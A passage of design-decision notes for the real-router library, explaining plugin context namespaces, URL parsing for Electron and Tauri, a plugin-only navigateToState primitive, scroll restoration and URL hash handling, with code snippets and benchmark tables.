
### Solution

New `state.context` field — required, mutable, present on every State object. Claim-based API mirrors the `extendRouter()` pattern:

```typescript
// Plugin registration
const claim = api.claimContextNamespace("navigation");

// During transition — O(1) property assignment
claim.write(state, { direction: "forward", userInitiated: true });

// Teardown
claim.release();
```

**Collision detection:** `claimContextNamespace` tracks claimed keys in a `Set<string>`. Duplicate claims throw immediately — O(1) lookup, caught at registration time, not at runtime.

**Freeze pipeline refactored:** Recursive `deepFreezeState()` replaced with targeted shallow freezes. Core freezes `state` and `state.context` (the container). Plugin authors are responsible for freezing their own payloads — they know the shape, core does not. This avoids freezing third-party objects with non-configurable properties and removes the `structuredClone` overhead from the hot path.

### Why

- **Data locality** — plugin data lives on the State object itself. No WeakMap indirection, no parallel storage. `state.context.navigation.direction` is a property read.
- **Framework adapter access** — adapters expose `route.context` directly. React: `useRoute().context.navigation.direction`. Vue: `route.value.context.ssr.loaderData`. No extra hooks, no separate subscriptions.
- **TypeScript DX** — module augmentation on `@real-router/types` `StateContext` interface. Each plugin augments its own namespace. Consumers get full autocompletion on `state.context.*`.
- **Zero hot-path overhead** — `claim.write(state, value)` is a literal property assignment (`state.context[namespace] = value`). No proxy, no observable wrapper, no clone.

### Before

```typescript
// navigation-plugin — WeakMap storage, global getter
const metaMap = new WeakMap<State, NavigationMeta>();

// During transition
metaMap.set(toState, { direction: "forward", userInitiated: true });

// Consumer access — must import and call a global method
const meta = router.getNavigationMeta(router.getState());
```

### After

```typescript
// navigation-plugin — claim-based, data on state
const claim = api.claimContextNamespace("navigation");

// During transition — direct property assignment
claim.write(toState, { direction: "forward", userInitiated: true });

// Consumer access — property read on route
const direction = route.context.navigation.direction;
```

### Migrated plugins

| Plugin                     | Context namespace(s)    | Data                                            |
| -------------------------- | ----------------------- | ----------------------------------------------- |
| `navigation-plugin`        | `navigation`            | direction, sourceElement, userInitiated         |
| `ssr-data-plugin`          | `data` (+ `ssrDataMode`, `ssrDataDeferred`, `ssrDataDeferredKeys`) | per-route loader result + mode marker + deferred-promise registry (#610) |
| `rsc-server-plugin`        | `rsc` + `rscAction`     | per-route ReactNode + server-action results     |
| `persistent-params-plugin` | `persistentParams`      | persistent params snapshot                      |
| `browser-plugin`           | `browser` + `url`       | popstate/navigate source + URL fragment (#532)  |
| `memory-plugin`            | `memory`                | direction, historyIndex                         |

### Not migrated

`hash-plugin` (low-priority analog of browser-plugin), `search-schema-plugin`, `preload-plugin`, `validation-plugin`, `lifecycle-plugin`, `logger-plugin` — none of these produce data consumed by UI. They either transform inputs (search-schema, validation), orchestrate side-effects (lifecycle, preload), or observe without writing (logger, hash).

## Leading Zeros in `numberFormat: "auto"` (search-params)

### Problem

`autoNumberStrategy.decode("00")` returned `0` — leading zeros were silently stripped during URL roundtrip. Property-based test (`pathRoundtrip.properties.ts`) caught this with counterexample `{q: "00"}`: `buildPath → matchPath` changed `"00"` to `0`.

Similarly, `decode("99999999999999999")` returned `100000000000000000` — precision loss for unsafe integers.

### Solution

Two guards added to `autoNumberStrategy.decode()` in `packages/search-params/src/strategies/number.ts`:

1. **Leading zeros**: strings starting with `0` where second char is not `.` return `null` (stay as strings). `"0"` and `"0.5"` still parse as numbers.
2. **Unsafe integers**: `Number.isSafeInteger()` check rejects integers beyond `MAX_SAFE_INTEGER`.

### Why this matters

URL query params are fundamentally strings. `numberFormat: "auto"` is a convenience that should only convert unambiguous canonical numbers. `"00"` is not canonical (it's a string with semantic leading zero, e.g., ZIP codes, product codes). `"99999999999999999"` cannot be represented without precision loss.

## `defaultParseQueryString` Missing URI Decoding (path-matcher)

### Problem

`defaultBuildQueryString` encodes values via `encodeURIComponent`, but `defaultParseQueryString` returned raw slices without `decodeURIComponent`. Roundtrip: `{q: "hello world"}` → `"q=hello%20world"` → `{q: "hello%20world"}`.

### Solution

Added `decodeURIComponent()` to both key and value extraction in `defaultParseQueryString`.

### Why low priority

`defaultParseQueryString` is a fallback for standalone `path-matcher` usage. Standard configuration uses `search-params` package (injected via DI in `route-tree/createMatcher.ts`) which handles encoding correctly.

## Unified Strict-Mode Behavior on Unmatched URLs (#483)

### Problem

`allowNotFound: false` had inconsistent semantics depending on the entry point:

| Entry point                    | Behaviour on unmatched URL + strict mode                            |
| ------------------------------ | ------------------------------------------------------------------- |
| `router.start(path)`           | throws `ROUTE_NOT_FOUND`                                            |
| `browser-plugin` popstate      | silent `router.navigateToDefault({ reload, replace })`              |
| `navigation-plugin` navigate   | silent `router.navigateToDefault()` in `event.intercept`            |
| `hash-plugin` popstate         | silent fallback (shared `browser-env/popstate-handler`)             |

The same configuration, the same unmatched URL → three different outcomes depending on how the URL arrived. `defaultRoute` was overloaded: explicit target for `navigateToDefault()` **and** implicit auto-fallback on popstate. The silent fallback hid errors from logs, analytics, and the `onTransitionError` hook.

### Solution

Unified contract: `allowNotFound: false` means "unknown route is an error, reported, everywhere". `start()` already implemented it — the three plugins now match.

1. Added `PluginApi.emitTransitionError(error)` — a standard point-of-entry for plugins to emit `$$error` without synthesising a navigation. Delegates to `ctx.emitTransitionError` on `RouterInternals`, which calls `eventBus.sendFailSafe(undefined, state.get(), error)` (safe at any FSM state — direct emit when not READY).
2. `shared/browser-env/popstate-handler.ts`: strict-mode else-branch emits `ROUTE_NOT_FOUND` via `api.emitTransitionError` and calls `rollbackUrlToCurrentState()` (replaces URL with the current router state's path) — no more silent `navigateToDefault`.
3. `navigation-plugin/navigate-handler.ts`: strict-mode branch emits the same error and throws inside an `async` `event.intercept()` handler — Navigation API auto-rolls back the URL via intercept rejection.
4. `hash-plugin`: inherits the fix via `browser-env` symlink.

### Incidental fix bundled in

The popstate-handler catch was extended: `RouterError` from `deps.router.navigate()` (e.g., `CANNOT_DEACTIVATE` from a blocking guard) now also rolls the URL back. Previously, guard-rejected popstate left the browser URL on the new location while state stayed on the old — an inconsistent observable state.

Teardown-safe: the rollback is wrapped in try/catch because `router.buildUrl` may have been removed by plugin teardown while a popstate event was still queued.

### Userland migration

Users who relied on the silent fallback subscribe explicitly:

```ts
router.usePlugin(() => ({
  onTransitionError(_toState, _fromState, err) {
    if (err.code === "ROUTE_NOT_FOUND") {
      void router.navigateToDefault({ replace: true });
    }
  },
}));
```

### Why this matters

- Closes #471 case 3 from the opposite direction — `{ allowNotFound: false, defaultRoute: "" }` is no longer a dead-end configuration.
- Single purpose for `defaultRoute`: only the explicit `router.navigateToDefault()` target.
- All error surfaces go through one channel (`onTransitionError`) — uniform observability for logs, analytics, and recovery UIs.

## Scroll Restoration as Utility, Not Plugin

**Problem.** SPA navigation typically loses scroll position — users expect back/forward to restore where they left off (browser default for MPAs, universally emulated by modern SPA routers: Angular `withInMemoryScrolling`, React Router `<ScrollRestoration>`, Vue `scrollBehavior`). Real-router shipped no such feature, putting us behind parity.

**Solution.** Added `shared/dom-utils/scroll-restore.ts` exposing `createScrollRestoration(router, options?)` — a function-shaped utility with the same contract as `createRouteAnnouncer`. Each framework adapter wires it to a `scrollRestoration?: ScrollRestorationOptions` prop on `RouterProvider` (Angular: options bag on `provideRealRouter`). Lifecycle tied to provider mount/unmount.

**Why not a `@real-router/scroll-plugin`.** `window.scrollY` is a DOM concern; router-core is DOM-agnostic (`state.name` / `params` / `context` only). A plugin would be a layering leak — the same mistake as Angular's `TitleStrategy` inside router-core. The routing-layer inputs the utility needs (direction, navigationType) are already published by `@real-router/navigation-plugin` via `state.context.navigation`. A plugin would duplicate an existing channel without adding value.

### Key-Synthesis Decision: Composite Route Identity, Not Per-Entry UUID

**Problem.** The issue specification (#497) called for keying saved positions by `history.state.key`. Investigation showed:

- `@real-router/browser-plugin.history.state` contains `{ name, params, path }` only — no key.
- `@real-router/navigation-plugin` exposes entry `.key` internally (Navigation API) but does **not** publish it on `state.context`.

Pulling a per-entry UUID into the public contract would require coordinated changes in `browser-plugin` (write UUID on every entry) and a new context namespace — a larger RFC.

**Solution.** The utility synthesizes the key as `${state.name}:${canonicalJson(state.params)}`. Two history entries that resolve to the same `(name, params)` pair collapse to one bucket; the latest save wins. This key-shape satisfies ~99% of real-world scroll-restoration UX (list → item → back) with zero plugin coupling.

**Why acceptable.** The alternative — emit `canonical-json(path)` or write UUIDs into `history.state` from `browser-plugin` — adds cross-package coordination for a case (same-name+same-params entries appearing multiple times in history) that is rare and self-correcting (subsequent saves overwrite).

### Capture Strategy: Subscribe + pagehide, Not Throttled Scroll Listener

**Problem.** Common scroll-restoration implementations attach a throttled `scroll` listener to continuously persist `window.scrollY`. This adds complexity (throttle timer, flush-on-transition, debouncing) and produces hundreds of sessionStorage writes per page.

**Solution.** Use two discrete event sources:

1. `router.subscribe(({ route, previousRoute }) => ...)` — fires on transition success. Synchronously from the FSM's `$$success` event, **before** the framework re-renders the new route. At that instant `window.scrollY` still reflects the old DOM, so we capture it keyed by `previousRoute`.
2. `pagehide` — single listener that saves the current route's position on reload / tab close.

No throttling, no timers, no scroll listener. Precision guaranteed because capture runs at the exact navigation boundary rather than "within 100ms of the last scroll."

### Why Default Mode = `"restore"`

The utility is **opt-in** (`undefined` = off), so users who don't want restoration pay nothing. But when they opt in, `"restore"` matches expected UX (what they'd get in an MPA by default, and what every competitor ships). Users wanting different semantics pass `mode: "top"` or `mode: "manual"` explicitly.

### Why Not Expose `ScrollRestorationOptions` from Adapter Roots

`RouteAnnouncerOptions` is already not re-exported from any adapter's public entry (`RouterProvider` prop-type inference covers consumer needs). `ScrollRestorationOptions` follows the same convention. If users ask, we promote in a later minor.

## safeParseUrl — scheme-agnostic parser (#496)

### Problem

Before [issue #496](https://github.com/greydragon888/real-router/issues/496), `shared/browser-env/url-parsing.ts` contained:

```ts
export function safeParseUrl(url: string, context: string): URL | null {
  try {
    const parsed = new URL(url, globalThis.location.origin);
    if (!["http:", "https:"].includes(parsed.protocol)) {
      console.warn(`[${context}] Invalid URL protocol in ${url}`);
      return null;
    }
    return parsed;
  } catch (err) {
    console.warn(`[${context}] Could not parse url ${url}`, err);
    return null;
  }
}
```

Two failure modes in desktop WebViews:

1. **`TypeError` on `file://`.** In Electron windows loaded via `win.loadFile(...)`, `globalThis.location.origin` returns the string `"null"` (not `null` — the literal four characters). `new URL("/users", "null")` throws `TypeError: Invalid base URL`. Both `browser-plugin` and `navigation-plugin` became unusable in Electron `file://` windows without a custom protocol.
2. **Whitelist rejected non-HTTP schemes.** Protocols `app://` (Electron custom scheme), `tauri://` (Tauri macOS/iOS), `asset://`, and any other desktop runtime URL failed the `["http:", "https:"].includes(parsed.protocol)` check. The function returned `null` with a console warning, the plugin treated the URL as invalid, and navigation silently failed.

Both issues blocked real-world desktop usage without downstream patches.

### Solution

Rewrote `safeParseUrl` as a **manual, scheme-agnostic parser** that produces `{ pathname, search, hash }` directly:

```ts
export interface ParsedUrl {
  pathname: string;
  search: string;
  hash: string;
}

export function safeParseUrl(url: string): ParsedUrl {
  // Manual parse — works for any scheme: tauri://, app://, file://, https://, path-only, opaque.
  // ... implementation details ...
}
```

Contract changes:

- Returns `ParsedUrl` (a plain struct), not `URL | null`.
- Total — never throws, never returns `null` for any input (empty string yields `{ pathname: "", search: "", hash: "" }`).
- `context` parameter removed — no warnings, no protocol whitelist.

Consumers — `browser-plugin`, `hash-plugin`, `navigation-plugin` — pass `url`, extract the field they need, and drop their null-case branches. `urlToPath(url, base, context)` in `shared/browser-env/url-utils.ts` also lost its `context` parameter.

### Why

1. **Routing doesn't need origin or protocol.** The router cares about `pathname`, `search`, and `hash`. The origin-check and protocol-check were false security: real desktop runtimes emit non-HTTP origins for legitimate content, and the matcher is already the source of truth for "is this URL valid for this app."
2. **Real-Router is the only router with explicit desktop support.** Users picking our router for Electron / Tauri come for this. Silently auto-downgrading or falling back to `memory-plugin` would hide the value — instead we document the compatibility matrix (see [Desktop Integration Guide](https://github.com/greydragon888/real-router/wiki/Desktop-Integration) in the wiki).
3. **Performance bonus.** The manual parser runs 4–6× faster than `new URL(url, origin)` on the URL-roundtrip fixtures used by `navigation-plugin`'s `hasVisited` / `getVisitedRoutes` hot path (both iterate every session-history entry). On short flat histories the win is invisible; on 100+ entries with frequent `peekBack` / `getVisitedRoutes` calls it matters.

### Before / After

```diff
-export function safeParseUrl(url: string, context: string): URL | null {
-  try {
-    const parsed = new URL(url, globalThis.location.origin);
-    if (!["http:", "https:"].includes(parsed.protocol)) {
-      console.warn(`[${context}] Invalid URL protocol`);
-      return null;
-    }
-    return parsed;
-  } catch {
-    return null;
-  }
-}
+export interface ParsedUrl { pathname: string; search: string; hash: string }
+export function safeParseUrl(url: string): ParsedUrl {
+  // ... manual scheme-agnostic parse ...
+}
```

### Consumers — code simplification

- `urlToPath(url, base, context)` → `urlToPath(url, base)`. The function is total and always returns a `string` starting with `/`.
- `entryToState` in `navigation-plugin` — removed `if (path === null) return undefined` branch.
- `matchUrl` in `browser-plugin` / `hash-plugin` — removed null-check, the expression collapsed to a single `return` without an intermediate variable.

See commit `06ccab93` for the full diff.

### Trade-offs

- **Breaking: callers receive `ParsedUrl`, not `URL`.** `safeParseUrl` is not a public export of any plugin — it lives in `shared/browser-env/`, consumed only by the three URL plugins in the monorepo. External consumers are not affected.
- **No scheme validation.** If `javascript:alert(1)` reaches the router, its "pathname" is extracted. The router still rejects it — it won't match any route → `navigateToDefault` / `navigateToNotFound`. Validation moved from the parser layer (where it was a false check) to the matcher layer (where it has always lived).
- **No warnings for debugging.** Previously a warning fired on every non-HTTP scheme, which was noise — the protocol was the expected behavior in Electron / Tauri. Debugging specific URLs is done with a targeted `console.log` in the plugin's call site, not a blanket parser warning.

### Test coverage

- Property tests on parser invariants — `packages/browser-env/tests/property/browserEnv.properties.ts`: valid HTTP paths, any scheme (desktop environments), `pathname` not polluted by `search` / `hash`.
- Property tests in consumer plugins — `packages/browser-plugin/tests/property/browserPlugin.properties.ts`, `packages/hash-plugin/tests/property/hashPlugin.properties.ts`, `packages/navigation-plugin/tests/property/{url-roundtrip,history-model,pure-functions}.properties.ts`: URL-roundtrip invariants preserved after the refactor.
- Functional tests across all three plugins updated — null-case branches removed, scheme-agnostic assertions added.
- 5 desktop examples (`examples/desktop/electron/{react,react-hash,react-navigation}` + `examples/desktop/tauri/{react,react-navigation}`) with 32 Playwright e2e specs including deep-link reload at three nested levels across `app://`, `file://`, and `tauri://` schemes.

### Related

- A short micro-benchmark lived in `benchmarks/core/url-parsing-compare.ts` during the refactor and was removed after validation — the new parser ran 4–6× faster than `new URL()` on 6 fixtures (shortHttp / longHttp / withQueryHash / hashRouting / customScheme / fileUrl) and ~3.87× faster on a history-iteration scenario of 100 entries. Results are captured in the #496 commit message (`06ccab93`); the bench itself wasn't kept because it was a one-shot validation.
- `navigation-plugin` hot path — `getVisitedRoutes` / `hasVisited` iterate every entry in the Navigation API's session history; the scheme-agnostic parser is measurable there.
- Public surface documented in [Desktop Integration Guide](https://github.com/greydragon888/real-router/wiki/Desktop-Integration) (wiki).

## navigation-plugin: Syncing Flag Owned by `NavigationBrowser`, Not the Plugin (#527)

### Problem

`packages/navigation-plugin/src/plugin-utils.ts` reimplemented `createStartInterceptor` and `createReplaceHistoryState` already living in `shared/browser-env/plugin-utils.ts` (used by `browser-plugin` and `hash-plugin`). The fork existed because of one extra invariant: `NavigationBrowser.replaceState` is implemented via `nav.navigate({history:"replace"})`, which fires a `navigate` event synchronously — and the same is true for `nav.navigate(...)`/`nav.updateCurrentEntry(...)`/`nav.traverseTo(...)`. The plugin had to gate the handler with `#isSyncingFromRouter = true` around every router-driven mutation, otherwise it would treat its own write as a user navigation. `history.replaceState` does NOT fire popstate, so the History API plugins didn't need the gate.

The pre-refactor design encoded the gate as 5+ manual `try/finally` blocks across `plugin.ts:onTransitionSuccess`, `navigate-handler.ts:recoverFromNavigateError`, `navigate-handler.ts:syncUrlToRouterState`, and the local `plugin-utils.ts`. A `setSyncing` callback threaded the flag through `createNavigateHandler` and `createReplaceHistoryState`. The result: the syncing invariant lived in N call-sites instead of one, and any new mutation method had to remember to wrap.

### Solution

Move ownership of the syncing flag into a per-instance plugin field. A new helper `wrapNavigationBrowserWithSyncing(browser, syncing)` produces a `NavigationBrowser` that raises a `SyncingFlag` (`{ current: boolean }`) before each router-driven mutation and lowers it after, including the throw path. `NavigationPlugin` creates its own `#syncing` cell in the constructor and applies the wrap to whatever browser the factory hands it — built-in `createNavigationBrowser(base)`, SSR fallback, or a user-supplied mock (e.g. `createMockNavigationBrowser` in tests). All consumers inherit the invariant for free, and two `NavigationPlugin` instances using the same factory output get **independent** syncing cells (no cross-router spillover).

Once the wrap was in place, the local `plugin-utils.ts` had no reason to exist:

- `createStartInterceptor` widened to accept a structural `LocationSource = { getLocation: () => string }` — both `Browser` and `NavigationBrowser` are assignable.
- `createReplaceHistoryState` widened to accept a structural `ReplaceStateBrowser = { replaceState; getHash }` — likewise.
- The buffer-reuse optimization (`createUpdateBrowserState`) was inlined into `createReplaceHistoryState` so its 5th argument shrinks to `preserveHash: boolean = true` (no extra parameters needed for navigation-plugin).

`NavigationPlugin.#syncing: SyncingFlag` is the single place the plugin holds the flag; `isSyncingFromRouter: () => this.#syncing.current` is the only path the navigate handler reads.

### Why not extend the shared utility with a `wrapWrite` callback?

The original RFC proposed adding `wrapWrite?: (write: () => void) => void` to `createReplaceHistoryState` as a hook navigation-plugin would use to inject `setSyncing`. Rejected because:

- Public shared signature would expand for a single consumer; `browser-plugin`/`hash-plugin` would always pass `undefined`.
- The hook only covered `replaceState` — but the syncing invariant applies to all 4 router-driven mutations (`navigate`, `replaceState`, `updateCurrentEntry`, `traverseTo`). 5+ manual `try/finally` blocks elsewhere would have remained.
- `setSyncing` is a re-entrancy detail of the `NavigationBrowser` wrapper (it knows its `replaceState` is implemented through `nav.navigate({history:"replace"})`), not of the shared utility. The right boundary is the browser wrapper, applied where the plugin instance owns it.

### Trade-offs

- The refactor shrinks navigation-plugin LOC and removes one source file, but adds the `wrapNavigationBrowserWithSyncing` helper (~25 LOC). Net is still negative; the architectural win is single ownership inside the plugin instance.
- User-supplied `NavigationBrowser` mocks no longer need to manage the flag themselves — the plugin wraps them in its constructor. This is a *contract change* for any external test code that previously wrapped manually, but no such consumer exists outside the monorepo (the `browser?` factory parameter has only ever been documented as "for testing").
- `factory.ts` and `types.ts` did not change as part of this refactor — `SyncingFlag` lives in `navigation-browser.ts` next to the wrapper, and the plugin constructor signature stays at 6 parameters. The flag never leaks to public types.

### Test coverage

- `wrapNavigationBrowserWithSyncing` invariants — `packages/navigation-plugin/tests/functional/navigation-browser.test.ts`: 4 mutations × happy path, 4 mutations × throw path (flag clears in `finally`), non-mutation methods bypass the wrap, `currentEntry` getter stays live (not snapshotted).
- All pre-existing functional + stress tests pass unchanged — observable behavior is identical (222 navigation-plugin, 129 browser-plugin, 84 hash-plugin).


## `getPluginApi(router).navigateToState(state, opts)` — plugin-only bypass for `buildNavigateState` (#525)

### Problem

URL plugins (`browser-plugin`, `hash-plugin`, `navigation-plugin`) handle every browser-initiated navigation by:

1. `api.matchPath(url)` — produces a fully-resolved `State` (includes `forwardState`, decoders, source-URL trailing-slash via `matchSourceTrailingSlash`).
2. `router.navigate(matchedState.name, matchedState.params, opts)` — re-runs `buildNavigateState` (`RouterWiringBuilder.ts:135-156`), which calls `ctx.forwardState` *and* `ctx.buildPath` again inside the navigation pipeline.

The second pass had two costs documented in #525:

- **Perf (Q3)**: 0.4–1.4 µs per browser navigation (1.20×–1.51× factor depending on fixture). Round-trip benchmark in `packages/core/tests/benchmarks/navigation/popstate-roundtrip.bench.ts`.
- **Correctness (Q2)**: `buildNavigateState` rebuilds `state.path` *without* the source URL, so `trailingSlash:"preserve"` lost the trailing slash on every back/forward / link click. `matchedState.path === "/users/"` but committed `state.path === "/users"`. Confirmed by `packages/core/tests/functional/trailingSlashPreserve.test.ts`.

### Solution

Add `getPluginApi(router).navigateToState(state, opts?)` — a **plugin-only** navigation primitive on `PluginApi` that takes a fully-resolved `State` and skips `buildNavigateState`. NOT exposed on the public `Router` or `Navigator` interfaces — userland navigates via `router.navigate(name, params, opts)` as before, with the full interceptor pipeline. The bypass is reserved for plugins that already hold a `State` from `api.matchPath(url)` and would otherwise pay the round-trip cost on every browser event.

Architecturally:

- `NavigationNamespace.navigate` was refactored to extract the post-`buildNavigateState` pipeline into `#executeNavigation`. Both `navigate(name, params)` and `navigateToState(state)` delegate to it; the only difference is whether `buildNavigateState` runs first.
- `Router` constructor registers the entry point on the `RouterInternals` WeakMap (alongside `start`, also there) — not on the `Router` class facade. `getPluginApi.navigateToState` calls through `ctx.navigateToState`, which preserves the same `lastSyncResolved`/`lastSyncRejected` bookkeeping and unhandled-rejection suppression that `Router.navigate` uses, so plugin call-sites can fire-and-forget the returned promise (popstate handlers do).
- `getPluginApi` is now WeakMap-cached per router (mirrors `getNavigator`). Avoids re-allocating the closure-bag on each call AND gives `vi.spyOn(getPluginApi(router), "navigateToState")` a stable identity to attach to — used by the recovery tests in browser-plugin / hash-plugin / navigation-plugin.

All four URL-driven flows migrated to use the same primitive — `URL → matchPath → navigateToState`:

- `packages/core/src/namespaces/RouterLifecycleNamespace/RouterLifecycleNamespace.ts` — `router.start(path)` now commits `matchPath(path)` via `deps.navigateToState(matched, REPLACE_OPTS)` instead of deconstructing back to `(name, params)` and calling `deps.navigate`. Closes the asymmetry that made `await router.start("/users/")` canonicalize the trailing slash while a subsequent popstate-back to the same URL would preserve it.
- `packages/navigation-plugin/src/navigate-handler.ts` — the `event.intercept(...)` handler now calls `api.navigateToState(matchedState, …)`.
- `shared/browser-env/popstate-handler.ts` (consumed by `browser-plugin` and `hash-plugin`) — popstate path uses `api.navigateToState(state, …)`. `getRouteFromEvent` now returns `State | undefined` (synthesizes via `api.makeState` when `evt.state` is structurally valid; falls back to `api.matchPath(getLocation())` otherwise).

This makes `navigateToState` the canonical primitive for **every** URL-driven entry point (initial start + browser back/forward + Navigation API events). Programmatic `router.navigate(name, params)` is reserved for intent-driven calls (Link clicks, declarative API consumers) where the full interceptor pipeline is the right semantics.

### Why bypassing `forwardState`/`buildPath` interceptors is correct, not a hack

`matchPath` already runs `forwardState` (`RoutesNamespace.ts:261`, intercepted) once. Re-running it inside `buildNavigateState` is a no-op when forwarding is idempotent (the common case) and *unsafe* when it isn't — a dynamic `forwardFn` reading mutable global state could send the user to a different route than what the URL bar shows. Skipping the second pass is the correctness-preserving choice.

`buildPath` interceptors (`persistent-params-plugin`) do NOT run on this path. For browser-initiated navigation the URL the user actually saw and clicked is the source of truth; transforming it would silently rewrite the URL bar after every back/forward. Programmatic callers (`router.navigate(name, params)`) still see all interceptors — that's the documented asymmetry, and the reason `navigateToState` lives on `PluginApi` rather than on `Router`.

### Trade-offs

- Adds a second navigation entry point. Future invariants on `navigate` must be replicated on `navigateToState`. Mitigated by sharing the post-`buildNavigateState` pipeline (both feed into `#executeNavigation` → `executeGuardPipeline` → `completeTransition`).
- Plugins relying ONLY on `buildPath` interception (no matching `forwardState` interceptor) would lose effect on browser-initiated navigation. None exist in the monorepo today; `persistent-params-plugin` registers both interceptors with idempotent merge logic, so it is symmetric.
- `matchPath` returns deeply-frozen states (`freezeStateInPlace`). `completeTransition` mutates `state.transition`, so `navigateToState` clones the input into a writable shell (`{ name, params, path, context: {...} }`) before handing it to the pipeline. One extra allocation per call; still net-negative vs the `buildNavigateState` cost it replaces.
- `getPluginApi` caching changes object identity from "fresh per call" to "shared per router". Verified there are no tests asserting fresh-per-call identity beyond the one in `getPluginApi.test.ts`, which was inverted to assert caching (and a sibling test pins per-router uniqueness).

### Measurement

Delta from `popstate-roundtrip.bench.ts` on Apple silicon / Node 24:

| Fixture | matchPath only | `+ navigate` (old) | `+ navigateToState` (new) | new vs old |
| --- | --- | --- | --- | --- |
| flat | 2.02 µs | 2.69 µs | 2.44 µs | **−0.25 µs (−9%)** |
| nested-4 | 2.39 µs | 3.54 µs | 2.90 µs | **−0.64 µs (−18%)** |
| search-params | 2.90 µs | 4.17 µs | 3.34 µs | **−0.83 µs (−20%)** |
| forwardTo | 2.06 µs | 2.48 µs | 2.19 µs | **−0.29 µs (−12%)** |
| defaultParams | 2.55 µs | 3.73 µs | 3.00 µs | **−0.73 µs (−20%)** |
| trailingSlash:"preserve" | 2.06 µs | 2.66 µs | 2.53 µs | **−0.13 µs (−5%)** |

The biggest wins are on the heavy-params fixtures (search-params, defaultParams) where the redundant `forwardState`/`buildPath` allocations dominate. trailing-slash fixture sees the smallest perf delta but fixes a correctness bug that the slow path could not.

### Test coverage

- `packages/core/tests/functional/navigation/navigateToState.test.ts` — 11 functional tests (happy path with/without options, ROUTER_NOT_STARTED / ROUTE_NOT_FOUND / SAME_STATES / guard rejections, UNKNOWN_ROUTE shape, validator-absent fallback).
- `packages/core/tests/functional/trailingSlashPreserve.test.ts` — 3 pinned contracts: matchPath preserves slash, `api.navigateToState` propagates it end-to-end, programmatic `router.navigate(name, params)` canonicalizes (documented asymmetry).
- `packages/core/tests/functional/matchPathInterceptors.test.ts` — Q1 audit pinning the interceptor-application contract.
- `packages/core/tests/functional/api/getPluginApi/getPluginApi.test.ts` — caching contract (`getPluginApi(router) === getPluginApi(router)`, distinct per router instance).
- `packages/validation-plugin/tests/functional/navigation.validation.test.ts` — `validateNavigateToStateArgs` (null/string/wrong-field-type rejections, valid state acceptance, options validation).
- 3 plugin functional + stress test suites updated to spy on `getPluginApi(router).navigateToState` instead of `router.navigate` in browser-initiated paths.

### Public-API impact

- `getPluginApi(router).navigateToState(state, opts?)`: new method on `PluginApi` (plugin-internal surface, declared in `@real-router/types/api`).
- `Router` and `Navigator` interfaces: **unchanged**. No new userland methods.
- `RouterValidator.navigation.validateNavigateToStateArgs`: new namespaced validator (state shape).
- `getPluginApi(router)`: same return type, now WeakMap-cached per router.

`@real-router/core` and `@real-router/types` bumped `minor` (PluginApi extension); `@real-router/validation-plugin` `minor` (matches the typed surface). The three URL plugins are `patch` (internal call-site migration; no API change).

## URL Fragment ("hash") Support — Plugin-Layer Design (#532)

### Problem

Pre-#532, URL fragments lived in three workarounds:

1. `shouldPreserveHash = !fromState || fromState.path === toState.path` in navigation-plugin & browser-plugin's `onTransitionSuccess` — hash dropped on cross-path navigation, no way to set/clear explicitly.
2. `urlToPath()` in `shared/browser-env/url-utils.ts` stripped hash before matching → handler never saw the fragment from `event.destination.url`.
3. Same-path hash-click was swallowed by core's `SAME_STATES` rejection (`navigate-handler.ts` swallowed the error silently) → URL bar updated but `router.subscribe` listeners never fired.

### Solution

Hash treated as **URL-layer** state, owned by URL plugins (browser/navigation), not by core. Symmetric to #497 (scroll restoration utility): viewport-concerns in dom-utils, URL-concerns in plugins, routing-concerns in core.

Three coordinated additions:

- **`state.context.url`** — shared namespace claimed by both URL plugins. Type `{ hash: string; hashChanged: boolean }`. Hash storage form: decoded, no leading `#` (symmetric to params, no leading `?`).
- **`NavigationOptions.hash` augmentation** — tri-state in plugins' `index.ts`: `undefined` preserves current browser hash, `""` clears, non-empty sets. Plugins read in `onTransitionSuccess`.
- **`NavigationOptions.hashChange` (@internal)** — flag set by URL plugins on browser-driven hash-only nav (`event.hashChange === true` in navigation-plugin; popstate hashChange detection in browser-plugin). Combined with `force: true` to bypass SAME_STATES; subscribers disambiguate via `state.context.url.hashChanged`, not via the overloaded `force` flag.

### Why not in core

Hash is a URL-layer concept. Memory-plugin / NativeScript / SSR runtimes have no URL → no hash. Adding `hash` to core State would force every non-URL runtime to carry an empty `hash: ""` field and reason about identity it doesn't own. Same line that scroll restoration drew (#497).

### Hash-aware active state & state stabilization

Two follow-ups in `@real-router/sources`:

- `ActiveRouteSourceOptions.hash` — when defined, source is active iff route matches AND `state.context.url.hash` equals requested hash. Cache key includes hash; subscribe path detects hash flip via `state.context.url.hashChanged`. Hash-plugin runtime (no `url` namespace) returns `false` for any non-undefined `hash` — consistent with documented limitation.
- `stabilizeState` compares `state.context.url.hash` in addition to `path`, so `useRoute()` consumers re-render on same-path-different-hash navigation (tab-style UIs).

### `<Link hash>` API surface

6 adapters get a `hash?: string` prop on `<Link>` / `[realLink]` directive.

- Default `activeClassName="active"` is hash-aware: only the matching variant lights up — tab-style UIs work without manual workaround.
- Click handler routes through `navigateWithHash` (`shared/dom-utils/link-utils.ts`). When `hash` differs from `state.context.url.hash` on the same route+params, helper auto-adds `force: true, hashChange: true` → bypasses SAME_STATES.
- Solid's fast-path `routeSelector` is bypassed when `hash` is set (selector is hash-agnostic, slow path through `createActiveRouteSource` is required).

### Encoding contract

- Decoded form in `state.context.url.hash` (no `%` escapes, no leading `#`).
- Encoded at URL build time via `encodeURI(s).replace(/#/g, "%23")`: preserves RFC-3986 fragment sub-delims (`&`, `=`, `?`, `:`, `@`, etc.) while escaping `%` and `#`. `encodeURIComponent` was rejected — it over-encodes sub-delims.
- Decoded via `decodeURIComponent` with try/catch fallback to raw input for malformed `%XX` sequences.

### F5 / cold-load: hash is read lazily, not primed

Hash handling is **separate** from navigation-plugin's existing `navigationType` priming (which uses `browser.getActivationType()` to recover the cross-document `navigation.activation.navigationType` so the very first transition reports `reload`/`push`/`traverse`/`replace` correctly — see #531). That priming is Navigation-API-only and does not touch the URL fragment.

For hash, both URL plugins use a **lazy read** in `onTransitionSuccess`: on the first transition (`!fromState`), `getDecodedHash(browser)` is called to obtain the previous hash. By the time `onTransitionSuccess` fires, `location.hash` already reflects the destination URL — F5 on `/page#section`, fresh URL bar entry, and cross-document back/forward all read the correct value. An earlier draft captured the hash in the plugin constructor; this failed in tests where the mock URL is set after plugin construction, and offered no benefit over the lazy read.

### Hash-plugin limitation

